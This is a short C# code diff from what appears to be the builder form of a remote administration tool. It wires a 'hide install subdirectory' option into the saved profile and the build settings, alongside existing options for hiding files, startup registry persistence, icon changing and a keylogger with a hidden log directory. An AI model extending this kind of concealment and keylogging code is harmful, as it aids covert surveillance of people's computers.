@@ -39,6 +39,7 @@ namespace xServer.Forms
             GetInstallPath(profile.InstallPath).Checked = true;
             txtInstallsub.Text = profile.InstallSub;
             chkHide.Checked = profile.HideFile;
+            chkHideSubDirectory.Checked = profile.HideSubDirectory;
             chkStartup.Checked = profile.AddStartup;
             txtRegistryKeyName.Text = profile.RegistryName;
             chkChangeIcon.Checked = profile.ChangeIcon;
@@ -73,6 +74,7 @@ namespace xServer.Forms
             profile.InstallPath = GetInstallPath();
             profile.InstallSub = txtInstallsub.Text;
             profile.HideFile = chkHide.Checked;
+            profile.HideSubDirectory = chkHideSubDirectory.Checked;
             profile.AddStartup = chkStartup.Checked;
             profile.RegistryName = txtRegistryKeyName.Text;
             profile.ChangeIcon = chkChangeIcon.Checked;
@@ -261,10 +263,10 @@ namespace xServer.Forms
             options.Install = chkInstall.Checked;
             options.Startup = chkStartup.Checked;
             options.HideFile = chkHide.Checked;
+            options.HideInstallSubdirectory = chkHideSubDirectory.Checked;
             options.Keylogger = chkKeylogger.Checked;
             options.LogDirectoryName = txtLogDirectoryName.Text;
             options.HideLogDirectory = chkHideLogDirectory.Checked;
-            options.HideInstallSubdirectory = chkHideSubdirectory.Checked;
 
             if (options.Password.Length < 3)
             {
